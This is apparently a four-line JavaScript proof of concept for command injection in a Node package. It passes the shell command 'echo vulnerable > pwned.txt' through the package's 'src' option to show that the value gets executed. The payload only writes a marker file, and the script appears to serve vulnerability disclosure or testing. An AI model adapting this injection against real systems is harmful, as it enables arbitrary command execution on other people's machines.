var root = require("./package/src/index");
var attack_code = "echo vulnerable > pwned.txt";
var opt = { "src": attack_code }
root(opt);